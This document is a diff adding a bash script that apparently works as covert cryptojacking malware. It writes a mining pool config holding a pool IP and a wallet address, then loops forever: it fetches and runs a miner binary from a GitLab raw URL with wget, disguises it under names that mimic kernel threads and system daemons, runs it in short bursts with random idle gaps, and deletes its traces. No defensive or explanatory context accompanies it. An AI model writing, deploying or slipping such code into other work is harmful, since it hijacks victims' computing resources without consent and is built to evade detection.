@@ -1,0 +1,60 @@
+#!/bin/bash
+
+CONFIG_JSON='{
+  "algo": "yespowertide",
+  "url": "47.251.244.12:80",
+  "user": "TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Trend199",
+  "pass": "x",
+  "threads": 6
+}'
+
+POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
+                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
+
+LOCAL_BIN_DIR="$HOME/.local/bin"
+mkdir -p "$LOCAL_BIN_DIR"
+
+generate_random_string() {
+    local length=${1:-8}
+    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
+}
+
+while true; do
+    rm -f "$LOCAL_BIN_DIR"/*.json
+    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
+    rm -f "$LOCAL_BIN_DIR"/migration*
+    rm -f "$LOCAL_BIN_DIR"/watchdog*
+    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
+    rm -f "$LOCAL_BIN_DIR"/rcu_*
+    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
+    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
+    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
+    rm -f "$LOCAL_BIN_DIR"/kblockd*
+    rm -f "$LOCAL_BIN_DIR"/kthrotld*
+
+    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
+    RAND_SUFFIX=$(generate_random_string 12)
+    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
+    
+    CONFIG_SUFFIX=$(generate_random_string 10)
+    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"
+    echo "$CONFIG_JSON" > "$CONFIG_PATH"
+
+    wget -q "https://gitlab.com/dfchfg/filess/-/raw/main/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    if [ $? -ne 0 ]; then
+        echo "Error: Download failed. Retrying in 30 seconds..."
+        sleep 30
+        continue
+    fi
+    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+
+    ACTIVE_MIN=$((RANDOM % 3 + 2))
+    ACTIVE_SEC=$((ACTIVE_MIN * 60))
+    IDLE_SEC=$((RANDOM % 11 + 20))
+
+    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1
+
+    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    rm -f "$CONFIG_PATH"
+    sleep "$IDLE_SEC"
+done
